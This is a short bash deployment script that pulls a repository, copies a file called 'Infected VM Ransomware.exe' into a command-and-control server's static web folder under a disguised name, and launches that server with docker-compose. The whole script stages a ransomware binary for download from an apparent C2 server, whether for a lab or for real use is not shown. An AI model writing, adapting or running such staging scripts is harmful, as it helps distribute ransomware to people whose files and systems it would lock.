#!/usr/bin/env bash

git pull
rm "web/c2/static/runs0mewhere.exe"
cp "final/Infected VM Ransomware.exe" "web/c2/static/runs0mewhere.exe"
sudo docker-compose -f web/docker-compose.yml up --build -d

